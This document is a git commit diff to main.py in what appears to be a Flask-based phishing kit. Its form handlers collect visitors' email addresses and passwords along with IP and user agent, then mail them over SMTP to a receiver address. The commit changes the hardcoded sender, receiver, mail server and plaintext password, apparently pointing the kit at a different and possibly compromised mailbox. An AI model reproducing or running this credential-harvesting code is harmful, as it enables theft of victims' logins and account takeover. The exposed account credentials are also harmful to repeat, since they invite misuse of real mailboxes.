981fff797e5445b7b553c38ca468073586863f0b
raina8 <147160392+raina8@users.noreply.github.com>
2024-07-12 21:13:45 -0700

    Update main.py

--- main.py
+++ main.py
@@ -145,9 +145,9 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "ghost@newupdateishere.com"
-        receiver_email = "smik@newupdateishere.com"
-        password = "yhG]rLZwK1!)"
+        sender_email = "eissa@waterworldwaterpark.com"
+        receiver_email = "s.toihidi@gmail.com"
+        password = "EISSA47314A"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "KOREA UPDATE ! 1"
@@ -163,7 +163,7 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("mail.newupdateishere.com", 465) as server:
+        with smtplib.SMTP_SSL("mail.waterworldwaterpark.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
@@ -182,9 +182,9 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "ghost@newupdateishere.com"
-        receiver_email = "smik@newupdateishere.com"
-        password = "yhG]rLZwK1!)"
+        sender_email = "eissa@waterworldwaterpark.com"
+        receiver_email = "s.toihidi@gmail.com"
+        password = "EISSA47314A"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "KOREA UPDATE !! 2"
@@ -200,7 +200,7 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("mail.newupdateishere.com", 465) as server:
+        with smtplib.SMTP_SSL("mail.waterworldwaterpark.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('lasmo'))
